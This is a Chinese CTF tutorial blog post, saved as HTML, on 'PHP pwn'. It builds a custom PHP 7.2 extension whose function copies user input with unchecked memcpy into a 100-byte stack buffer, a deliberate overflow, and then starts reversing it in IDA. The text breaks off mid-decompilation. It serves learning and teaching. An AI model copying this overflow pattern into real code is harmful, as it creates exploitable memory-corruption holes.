@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>非常规PWN - Jsjsj</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="非常规PWN - Jsjsj" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://jsjsj.top/2022/10/03/%E9%9D%9E%E5%B8%B8%E8%A7%84PWN/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2022-10-03T14:13:56.000Z" />
+  
+  <meta property="og:article:author" content="Mr. Jsjsj" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+    <body
+        data-color-scheme="dark"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/projects">Projects</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/jsjsj1" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/pwn/">pwn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>3,</span>
+            <span>2022</span>
+        </div>
+        
+
+        <h2 class="title">非常规PWN</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="非常规PWN-Web-pwn-一"><a href="#非常规PWN-Web-pwn-一" class="headerlink" title="非常规PWN&amp;Web pwn(一)"></a>非常规PWN&amp;Web pwn(一)</h1><h3 id="前言：最近在学非常规pwn，然后想到了之前的php-pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web-php-pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里"><a href="#前言：最近在学非常规pwn，然后想到了之前的php-pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web-php-pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里" class="headerlink" title="前言：最近在学非常规pwn，然后想到了之前的php pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web(php) pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里"></a>前言：最近在学非常规pwn，然后想到了之前的php pwn，然后就觉得很有意思，原来PHP也可以被pwn（也许我是土🐕，之前一直想复现学习，一直拖到现在，其实web(php) pwn在前两年国际比赛中考察的很多，感觉也很偏向于实战web，所以本篇来叙述下，最后再以2020De1CTF-mixture这道题叙述下简单的做题技巧（这个大概放在第二篇章里</h3><h2 id="php-环境搭建"><a href="#php-环境搭建" class="headerlink" title="php 环境搭建"></a>php 环境搭建</h2><p>第一步我们需要在Ubuntu里安装个php的环境。命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.2 </span><br><span class="line">sudo apt install php-dev</span><br></pre></td></tr></table></figure>
+
+<p>这里我下载的是php7.2环境，因为题目环境php版本也是这个版本，然后去找到对应的源码编译下源码，源码推荐：<a target="_blank" rel="noopener" href="https://www.php.net/downloads.php">https://www.php.net/downloads.php</a>   <a target="_blank" rel="noopener" href="https://www.php.net/distributions/php-7.2.31.tar.xz">https://www.php.net/distributions/php-7.2.31.tar.xz</a></p>
+<p>然后我们看下源码的目录，每个目录的作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. build 和编译有关的目录。</span><br><span class="line">2. ext 扩展库代码，例如 MySQL、zlib、iconv 等我们熟悉的扩展库。其中/ext/standard/ 目录下是常用的标准函数集。</span><br><span class="line">3. main 主目录包含主要的 PHP 宏和定义。</span><br><span class="line">4. sapi 和各种服务器的接口调用，例如apache、IIS等，也包含一般的fastcgi、cgi等。</span><br><span class="line">5. win32 和 Windows 下编译 PHP 有关的脚本。</span><br><span class="line">6. Zend 文件夹核心的引擎，所有的 Zend API 定义与宏等。</span><br><span class="line">7. scripts Linux 下的脚本目录。</span><br><span class="line">8. tests 测试脚本目录</span><br><span class="line">9. sapi 各类 Web 服务器的接口。</span><br><span class="line">10.TSRM Zend 和 PHP 的 “线程安全资源管理器” (TSRM) 目录。</span><br><span class="line">11.pear 这个目录就是“PHP 扩展与应用仓库”的目录。包含了PEAR 的核心文件。</span><br></pre></td></tr></table></figure>
+
+<p>然后我们要想自己编译的话，在ext目录里进行编译</p>
+<p>命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=webpwn  #自己编译了个拓展库 webpwn</span><br></pre></td></tr></table></figure>
+
+<p>然后进到相应目录里，我们看下webpwn.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | PHP Version 7                                                        |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Copyright (c) 1997-2018 The PHP Group                                |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | This source file is subject to version 3.01 of the PHP license,      |</span></span><br><span class="line"><span class="comment">  | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">  | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">  | http://www.php.net/license/3_01.txt                                  |</span></span><br><span class="line"><span class="comment">  | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">  | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">  | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">  | Author:                                                              |</span></span><br><span class="line"><span class="comment">  +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $Id$ */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_ini.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_webpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* If you declare any globals in php_webpwn.h uncomment this:</span></span><br><span class="line"><span class="comment">ZEND_DECLARE_MODULE_GLOBALS(webpwn)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* True global resources - no need for thread safety here */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> le_webpwn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_INI</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Remove comments and fill if you need to have entries in php.ini</span></span><br><span class="line"><span class="comment">PHP_INI_BEGIN()</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_value&quot;,      &quot;42&quot;, PHP_INI_ALL, OnUpdateLong, global_value, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">    STD_PHP_INI_ENTRY(&quot;webpwn.global_string&quot;, &quot;foobar&quot;, PHP_INI_ALL, OnUpdateString, global_string, zend_webpwn_globals, webpwn_globals)</span></span><br><span class="line"><span class="comment">PHP_INI_END()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove the following function when you have successfully modified config.m4</span></span><br><span class="line"><span class="comment">   so that your module can be compiled into PHP, it exists only for testing</span></span><br><span class="line"><span class="comment">   purposes. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Every user-visible function in PHP should document itself in the source */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string confirm_webpwn_compiled(string arg)</span></span><br><span class="line"><span class="comment">   Return a string to confirm that the module is compiled in */</span></span><br><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">size_t</span> arg_len, len;</span><br><span class="line">	zend_string *strg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(strg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="comment">/* The previous line is meant for vim and emacs, so it can correctly fold and</span></span><br><span class="line"><span class="comment">   unfold functions in source code. See the corresponding marks just before</span></span><br><span class="line"><span class="comment">   function definition, where the functions purpose is also documented. Please</span></span><br><span class="line"><span class="comment">   follow this convention for the convenience of others editing your code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; php_webpwn_init_globals</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* Uncomment this function if you have INI entries</span></span><br><span class="line"><span class="comment">static void php_webpwn_init_globals(zend_webpwn_globals *webpwn_globals)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	webpwn_globals-&gt;global_value = 0;</span></span><br><span class="line"><span class="comment">	webpwn_globals-&gt;global_string = NULL;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* If you have INI entries, uncomment these lines</span></span><br><span class="line"><span class="comment">	REGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* uncomment this line if you have INI entries</span></span><br><span class="line"><span class="comment">	UNREGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request start */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(COMPILE_DL_WEBPWN) &amp;&amp; defined(ZTS)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request end */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;webpwn support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Remove comments if you have entries in php.ini</span></span><br><span class="line"><span class="comment">	DISPLAY_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_functions[]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Every user visible function must have an entry in webpwn_functions[].</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">	PHP_FE(confirm_webpwn_compiled,	<span class="literal">NULL</span>)		<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">	PHP_FE_END	<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry webpwn_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;webpwn&quot;</span>,</span><br><span class="line">	webpwn_functions,</span><br><span class="line">	PHP_MINIT(webpwn),</span><br><span class="line">	PHP_MSHUTDOWN(webpwn),</span><br><span class="line">	PHP_RINIT(webpwn),		<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request start */</span></span><br><span class="line">	PHP_RSHUTDOWN(webpwn),	<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request end */</span></span><br><span class="line">	PHP_MINFO(webpwn),</span><br><span class="line">	PHP_WEBPWN_VERSION,</span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_DL_WEBPWN</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(webpwn)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Local variables:</span></span><br><span class="line"><span class="comment"> * tab-width: 4</span></span><br><span class="line"><span class="comment"> * c-basic-offset: 4</span></span><br><span class="line"><span class="comment"> * End:</span></span><br><span class="line"><span class="comment"> * vim600: noet sw=4 ts=4 fdm=marker</span></span><br><span class="line"><span class="comment"> * vim&lt;600: noet sw=4 ts=4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里我们主要看两个关键的部分，一个是用来写我们生成的主代码函数PHP_FUNCTION</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">size_t</span> arg_len, len;</span><br><span class="line">	zend_string *strg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(strg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们主要的代码就是在 这里面进行写，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">size_t</span> arg_len, len;</span><br><span class="line">	zend_string *strg;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,arg,arg_len);</span><br><span class="line">	php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们写完一个函数，然后需要注册下这个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">	PHP_FE(confirm_webpwn_compiled,	<span class="literal">NULL</span>)		<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">	PHP_FE(webpwn,<span class="literal">NULL</span>)   <span class="comment">//在这里进行注册，然后注册个刚刚写的函数</span></span><br><span class="line">	PHP_FE_END	<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注册好以后，下一步直接make，进行make一下即可</p>
+<p>make后，会在对应的目录下生成一个modules。这里面就是我们需要的扩展库</p>
+<p>然后在我们的php.ini加载扩展库</p>
+<p>查找php.ini方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name php.ini</span><br><span class="line">/etc/php/7.2/cli/php.ini</span><br><span class="line">在php.ini加载我们自己生成的拓展库</span><br><span class="line">extension=webpwn.so</span><br></pre></td></tr></table></figure>
+
+<p>加载起来，下一步我们还要把对应的库放到我们本地对应的加载库里，如何找这个本地库的位置呢</p>
+<p>我们先写个php文件让它运行php test.php | grep “webpwn” </p>
+<p>然后报错：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;webpwn.so&#x27; (tried: /usr/lib/php/20170718/webpwn.so (/usr/lib/php/20170718/webpwn.so: cannot open shared object file: No such file or directory), /usr/lib/php/20170718/webpwn.so.so (/usr/lib/php/20170718/webpwn.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到对应的目录里没有我们生成的库&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;</p>
+<p>那么我们就把自己生成的webpwn库放到这个文件夹里</p>
+<p>然后再运行就不报错了</p>
+<p>还有一点说的是</p>
+<p>我们编写的php文件，然后用php运行其中原理是用我们加载的指定的生成库</p>
+<p>那这样的话，我们就可以直接找到webpwn的思路了，直接去逆这个库，找到这个库的漏洞，是不是就能实现phppwn了，答案：是的</p>
+<p>把webpwn.so放到ida里，找到对应的函数，zif_webpwn:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">zif_webpwn</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+80h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *arg; <span class="comment">// [rsp+88h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  arg = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;n) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, arg, 